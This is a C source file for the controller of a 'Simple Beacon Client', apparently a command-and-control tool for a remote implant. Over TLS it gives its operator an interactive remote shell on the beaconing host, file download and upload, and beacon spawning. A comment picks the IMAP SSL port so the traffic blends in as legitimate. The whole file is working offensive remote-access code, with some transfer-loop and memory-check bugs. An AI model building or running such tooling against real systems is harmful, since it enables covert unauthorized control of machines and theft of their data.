#include "client.h"

#define USAGE                                                                 \
"usage:\n"                                                                    \
"  echoclient [options]\n"                                                    \
"options:\n"                                                                  \
"  -a                  Address to send the message.\n"                        \
"  -p                  Port to send to.\n"                                    \
"  -h                  Show this help message\n"                              \

/* OPTIONS DESCRIPTOR ====================================================== */
static struct option gLongOptions[] = {
  {"authenticate",     required_argument,      NULL,           'a'},
  {"port",             required_argument,      NULL,           'p'},
  {"help",             no_argument,            NULL,           'h'},
  {NULL,               0,                      NULL,             0}
};

//Prototype functions
int parseargs(int, char **, char **, int *);
int setuplistner(int, int *);
SSL_CTX* initCTX(void);
void loadcert(SSL_CTX *, char *, char *);
int cmdshell(SSL *);
int getfile(SSL *);
int putfile(SSL *);
void displayhelp(void);
void trim(char *);
int cmdloop(SSL *);
int entersession(SSL *, char *);
ssize_t ssl_readall(SSL *, uint8_t *, size_t, size_t *);
ssize_t ssl_writeall(SSL *, uint8_t *, size_t, size_t *);
ssize_t writeall(int, uint8_t *, size_t, size_t *);
ssize_t readall(int, uint8_t *, size_t, size_t *);

// Setup the main listening port
int setuplistner(int port, int *sockfd) {
  struct addrinfo hints, *servinfo, *p;
  int optval = 1;
  int status;
  char portstr[6];

  // Populate the hints for the following getaddrinfo()
  memset(&hints, 0, sizeof hints);    // Ensure the struct is empty
  hints.ai_family = AF_UNSPEC;        // Indiferent to IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM;    // TCP stream socket
  hints.ai_flags = AI_PASSIVE;        // Populate the IP for me

  // Get a string version of the port to bind to
  snprintf(portstr, 6,"%d", port);

  // Get address info
  if ((status = getaddrinfo(NULL, portstr, &hints, &servinfo)) != 0) {
    fprintf(stderr, "[-] Failed to acquire getaddrinfo: %s\n", gai_strerror(status));
    return -1;
  };

  // Loop through all returned interfaces and bind to the first viable one
  for(p = servinfo; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if ((*sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      perror("[-] Unable to acquire a socket.");
      continue;
    }

    // Attempt to set socket to reuseaddr
    if (setsockopt(*sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int)) == -1) {
      perror("[-] Unable to set socket reuse.");
      return -1;
    }

    // Bind to the specified port using the socket
    if (bind(*sockfd, p->ai_addr, p->ai_addrlen) == -1) {
      close(*sockfd);
      perror("[-] Unable to bind the socket.");
      continue;
    }
    break;
  }

  freeaddrinfo(servinfo);  // All done with the struct at this point

  // Report errors if we are unable to bind
  if (p == NULL) {
    fprintf(stderr, "[-] Failed to bind to %d\n", port);
    return -1;
  }

  // Attempt to listen
  if (listen(*sockfd, 2) == -1) {
    perror("[-] Failed to listen.");
    return -1;
  }

  // The socket is now listening and ready to be utilized
  // Pass the sockfd back to the main program to be utilized
  printf("[+] Client has started listening on 0.0.0.0:%s.\n", portstr);
  printf("[*] Awaiting connections from server.\n");
  return 0; 
}

// Initialize the SSL context
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_server_method();   // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

// Load the certificates into the process for use
void loadcert(SSL_CTX* ctx, char *cert, char *key) {
    // Set the local certificate from CertFile
    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Set the private key from KeyFile
    if (SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Verify the private key
    if (!SSL_CTX_check_private_key(ctx) ) {
        fprintf(stderr, "Private key does not match the public certificate\n");
        abort();
    }
}

/*
// Spawn a new connection immediately
int newconn(SSL *ssl) {
  
  char addr[INET6_ADDRSTRLEN];
  char port[6]
  
  // Send the command to the remote server
  ssl_writeall(ssl, (uint8_t *)"1", 2, &total_sent);


}
*/
// Enter into a remote shell
int cmdshell(SSL *ssl) {
  uint8_t msg[4096] = {0};
  uint8_t buf[4096] = {0};
  int res;
  size_t total_sent = 0, total_recv = 0;

  // Send the command to the remote server
  ssl_writeall(ssl, (uint8_t *)"2", 2, &total_sent);

  // Wait for the server to send back the date command.
  ssl_readall(ssl, buf, sizeof(buf), &total_recv);
  printf("Remote Shell Activated At: %s", buf);

  // Start a command loop -- interactive commands like vim, tmux, top, bash, will hang the terminal.
  //  this is because I am using a unidirectional pipe provided by popen. Could consider pipe, fork, exec later.
  while (1) {
    printf("sbsh> ");

    fgets((char *)msg, sizeof(msg), stdin);
    if (strcmp((char *)msg, "exit\n") == 0) {
      ssl_writeall(ssl, msg, sizeof(msg), &total_sent);
      break;
    }

    if (strcmp((char *)msg, "\n") == 0) {
      continue;
    }

    if (ssl_writeall(ssl, msg, sizeof(msg), &total_sent) < 0) {
      fprintf(stderr, "[-] Failed write to the server - exiting the shell interface now.\n");
      return 2;
    }
    memset(msg, 0, sizeof(msg));

    while((res = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) > 0) {
      //if (res == 1 && strcmp((char *)&buf[0],"\0") == 0) {
      if (strlen((char *)buf) == 0) {
        SSL_read(ssl, buf, 1);
        memset(buf, 0, sizeof(buf));
        break;
      }
      printf("%s", buf);
      memset(buf, 0, sizeof(buf));
    }
  }

  return 2;
}

// Retrieve a file from the remote system; place in /tmp with the specified localname
int getfile(SSL *ssl) {
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t total_recv = 0, total_sent = 0, written = 0;

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  // Create or open the local file 
  if ((fd = open((char *)localpath, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
    perror("[-] ERROR: Could not open designated local file");
    return 3;    
  }

  // Send the server a message letting it know we would like to recieve a file
  ssl_writeall(ssl, (uint8_t *)"3", 2, &total_sent);

  // Make sure the server is good to go with allowing us to recieve a file
  ssl_readall(ssl, ans, 4, &total_recv);
  if (strcmp((char *)ans, "300") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return 3;
  }

  // Send the file name that we would like to get 
  ssl_writeall(ssl, remotepath, sizeof(remotepath), &total_sent);

  // If the server can open the file it will send us the size of the file to be recieved
  memset(ans, 0, sizeof(ans));
  ssl_readall(ssl, ans, sizeof(ans), &total_recv);
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    fprintf(stderr, "[-] There was an error getting the size of the remote file.\n");
    return 3;
  }

  // Download the file
  printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
  while(written < (size_t)filesize) {
    ssl_readall(ssl, buf, sizeof(buf), &total_recv);
    writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written);
    memset(buf, 0, sizeof(buf));
  }
  close(fd);

  printf("[+] Wrote %ld bytes to %s.\n", written, localpath);

  return 3;
}

// Put a file on the remote system; place at the specified remote path
int putfile(SSL *ssl) {
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  struct stat st;
  size_t total_recv = 0, total_sent = 0, total_read = 0;

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  // Create or open the local file 
  if ((fd = open((char *)localpath, O_RDONLY)) == -1) {
    perror("[-] ERROR: Could not open designated local file");
    return 4;    
  }

  // Send the server a message letting it know we would like to put a file up
  ssl_writeall(ssl, (uint8_t *)"4", 2, &total_sent);

  // Make sure the server is good to go with allowing us to recieve a file
  ssl_readall(ssl, ans, 4, &total_recv);
  if (strcmp((char *)ans, "400") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s\n", ans);
    return 4;
  }

  // Send the file name that we would like to put our new file up as
  ssl_writeall(ssl, remotepath, sizeof(remotepath), &total_sent);

  // Check to ensure the server was able to open the remote file.
  memset(ans, 0, sizeof(ans));
  ssl_readall(ssl, ans, 4, &total_recv);
  if (strcmp((char *)ans, "401") != 0) {
    fprintf(stderr, "[-] The server was unable to open the remote file path for writing.\n");
    return 4;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fd, &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  ssl_writeall(ssl, ans, sizeof(ans), &total_recv);

  // Send the file
  printf("[*] Putting local file %s on remote and placing at %s.\n", localpath, remotepath);
  total_sent = 0;
  while(total_sent < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    readall(fd, buf, (size_t)filesize - total_read % sizeof(buf), &total_read);
    ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
  }
  printf("[+] Sent %ld bytes to remote server to be placed in %s.\n", total_read, remotepath);

  close(fd);
  return 4;
}

// Establish a tunnel
//int tunnel(SSL *ssl) {
//
//}

// Display total help menu
void displayhelp() {
  fprintf(stderr, 
    "=====================================\n"
    "   Simple Beacon Client Help Menu\n"
    "=====================================\n"
    "sbc> new -- Spawn a new beacon.\n"
    "sbc> cmd -- Enter a shell.\n"
    "sbc> get -- Get a file.\n"
    "sbc> put -- Put up a file.\n"
    "sbc> tun -- Start a tunnel.\n"
    "sbc> bye -- Exit the client.\n"
    "=====================================\n"
  );
}

// cmdloop interface
int cmdloop(SSL* ssl) {
  size_t ts;
  uint8_t msg[4096] = {0};
  
  printf("sbc> ");
  fgets((char *)msg, 4096, stdin);
  msg[strcspn((char *)msg, "\r\n")] = 0;
  
  if ((strcmp((char *)msg, "new")) == 0) {
    return 1;
  }
  if ((strcmp((char *)msg, "cmd")) == 0) {
    return cmdshell(ssl);
  }
  if ((strcmp((char *)msg, "get")) == 0) {
    return getfile(ssl);
  }
  if ((strcmp((char *)msg, "put")) == 0) {
    return putfile(ssl);
  }
  if ((strcmp((char *)msg, "tun")) == 0) {
    //return tunnel(ssl);
  }
  if ((strcmp((char *)msg, "bye")) == 0) {
    //https://stackoverflow.com/questions/18433585/kill-all-child-processes-of-a-parent-but-leave-the-parent-alive
    ssl_writeall(ssl, (uint8_t *)"6", 2, &ts);
    return 0;
  }
  displayhelp();
  return 10;
}

int entersession(SSL *ssl, char *auth) { // threadable
  uint8_t buf[4096] = {0};
  uint8_t msg[4096] = {0};
  //char *cmdv[5] = {NULL};
  size_t total_recv = 0, total_sent = 0;
  int bytes, sd, exit = 0;

  // Accept the inbound SSL connection
  while(SSL_accept(ssl) != 1) {                                   
    continue;
  }
  
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

  printf("[+] Connected with %s encryption\n", SSL_get_cipher(ssl));

  // Read the message sent which should be a request to authenticate "authenticate" is passed.
  if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0)) {     
    exit = -1;
    goto cleanup;
  }         
  if (strcmp((char *)buf, "10") != 0) {
    fprintf(stderr, "[-] Did not send authenticate message, recieved: %s.\n", buf);                             
    exit = -1;
    goto cleanup;
  }
  printf("[+] Server is ready for authentication.\n");

  // Send the authentication message
  printf("[*] Authenticating with: %s\n", auth);
  ssl_writeall(ssl, (uint8_t *)auth, strlen(auth), &total_sent);
  ssl_writeall(ssl, (uint8_t *)"", 1, &total_sent);                                
  printf("[*] Authentication message sent.\n");
  
  // Check to make sure the server is happy with the auth message
  //  3 shots at getting the right message else server initiates disconnect.
  memset(buf, 0, sizeof(buf));
  if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) < 0) {
    fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
    exit = -1;
    goto cleanup;
  }
  while(strcmp((char *)buf, "50") == 0) {
    fprintf(stderr, "[-] Authentication messages did not match. Please input the proper message.\n");
    printf("> Enter Authentication Message: ");
    fgets((char *)msg, 4096, stdin);
    printf("[*] About to send: %s", msg);
    if ((bytes = ssl_writeall(ssl, msg, sizeof(msg), &total_sent)) < 0) {
      fprintf(stderr, "[-] Error writing new authentication message to the server. Exiting now.\n");
      exit = -1;
      goto cleanup;
    }
    memset(buf, 0, sizeof(buf));
    if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) < 0) {
      fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
      exit = -1;
      goto cleanup;
    }
  }
  free(auth);
  printf("[+] Successfully authenticated! Entering session.\n");

  // Print Help Menu and then enter into menued context
  displayhelp();
  while(1) {
    if (cmdloop(ssl) <= 0) {
      break;
    }
  }

  cleanup:
  sd = SSL_get_fd(ssl);                       // Get socket connection
  SSL_free(ssl);                              // Release SSL state
  close(sd);                                  // Close connection
  return exit;
}

ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r < 0) {
        perror("[-] ERROR: SSL_read encountered and error");
        break;
      } else if (r == 0) {
        break;
      } else {
        recvd += r;
        (*total_recv) += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) < 0) {
      perror("[-] ERROR: SSL_write encountered an error");
      break;
    }
    (*total_sent) += s;
    sent += s;
  }

  return s;
}

ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
  ssize_t r = 0;
  size_t readin = 0;

  while(readin < len) {
    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
      break;
    }
    (*total_read) +=r;
    readin += r;
  }

  return r;
}

ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) < 0) {
      perror("[-] ERROR: Write function encountered an error");
      break;
    } else if (w == 0) {
      break;
    }
    (*total_written) += w;
    written += w;
  }

  return w;
}

void trim(char *str) {
  int i = 0, index = -1;

  while(str[i] != '\0') {
    if(!isspace(str[i])) {
      index = i;
    }
    i++;
  }
  str[index+1] = '\0';
}

int parseargs(int argc, char **argv, char **auth, int *port) {
  int option_char;
  char *authentication;
  int portno;

  // Parse and set command line arguments
  while ((option_char = getopt_long(argc, argv, "a:p:h", gLongOptions, NULL)) != -1) {
    switch (option_char) {
      case 'a':         // The authentication string to utilize
        authentication = optarg;
        break;
      case 'p':         // The port number to send traffic to. 
        portno = atoi(optarg);
        break;
      case 'h':         // Help message
        fprintf(stdout, "%s", USAGE);
        exit(0);
        break;
      default:
        fprintf(stderr, "%s", USAGE);
        exit(1);
    }
  }

  // Bounds and intialization checking
  if ((portno <= 0) || (portno > 65535)) {
    fprintf(stderr, "[-] ERROR: %s @ %d: invalid port number (%d).\n", __FILE__, __LINE__, portno);
    return -1;
  }

  *auth = calloc((strlen(authentication)+1), sizeof(char));
  if (auth == NULL) {
    fprintf(stderr, "[-] ERROR: Failed to allocate memory for the message.\n");
    return -1;
  }

  // Assign variable contents
  memcpy(*auth, authentication, (strlen(authentication)+1));
  (*port) = portno;

  return 0;
}

int main(int argc, char **argv) {
    // Variables
    int res;                                // Result of a function -- useful if we need to compare later on. 
    int port = SERVE_PORT;                  // Server port number -- IMAP SSL to potentially blend as legitimate SSL traffic.
    char *auth = NULL;                      // The authentication phrase 
    SSL_CTX *ctx;                           // SSL connection context pointer
    int sockfd;                             // The main listener socket file descriptor
    struct sockaddr_storage server;         // The sockaddr for the server that is beaconing
    socklen_t socklen = sizeof(server);     // The socklen for the server that is beaconing 
    SSL *ssl;                               // The SSL session pointer that is associated with a given session.
    int serverfd;                           // The serverfd that will be where we pass messages.
    struct sockaddr_storage peer;           // The storage space that will reveal the peer address information.
    socklen_t peerlen;                      // The peerlen message that is required for printing out peer info.
    char ipstr[INET6_ADDRSTRLEN];           // The ip address string for the peer -- is large enough to hold the max IPv6 length address.
    int keepalive = 1;
    int keepcnt = 3;
    int keepidle = 5; 
    int keepintvl = 15;

    // Ensure the user is running as root
    if(getuid() != 0) {
        fprintf(stderr, "[-] This program must be run as root/sudo user!");
        exit(0);
    }

    // Parse the arguments passed
    if ((res = parseargs(argc, argv, &auth, &port)) != 0) {
      fprintf(stderr, "[-] Bailing early due to previous error.");
      free(auth);
      exit(1);
    }

    // Initialize the SSL library
    SSL_library_init();                                                             // Get SSL library ready
    ctx = initCTX();                                                                // Initialize SSL
    loadcert(ctx, (char *)"../src/mycert.pem", (char *)"../src/mycert.pem");                                      // Load certs

    // Setup the core listening socket
    setuplistner(port, &sockfd);                                           // Create server socket
    
    // Catch a connection and start a session
    serverfd = accept(sockfd, (struct sockaddr *)&server, &socklen);                // Accept connection as usual

    // Set keepalives
    setsockopt(serverfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int));
    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int));
    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int));
    setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int));

    // Print who we are speaking to.
    peerlen = sizeof(peer);
    getpeername(serverfd, (struct sockaddr*)&peer, &peerlen);
    if (peer.ss_family == AF_INET) {
      struct sockaddr_in *p = (struct sockaddr_in *)&peer;
      port = ntohs(p->sin_port);
      inet_ntop(AF_INET, &p->sin_addr, ipstr, sizeof ipstr);
    } else { // AF_INET6
      struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
      port = ntohs(p->sin6_port);
      inet_ntop(AF_INET6, &p->sin6_addr, ipstr, sizeof ipstr);
    } 
    printf("[+] Established connection with server at %s:%d.\n", ipstr, port);
    
    // Establish an SSL connection
    ssl = SSL_new(ctx);                                                             // Get new SSL state with context
    SSL_set_fd(ssl, serverfd);                                                      // Set connection socket to SSL state
    
    // Enter into our session
    entersession(ssl, auth);                                                        // Enter into the session connection
    
    // Clean up the memory space and gracefully exit.
    close(serverfd);                                                                // Close the server socket
    SSL_CTX_free(ctx);                                                              // Release the context
}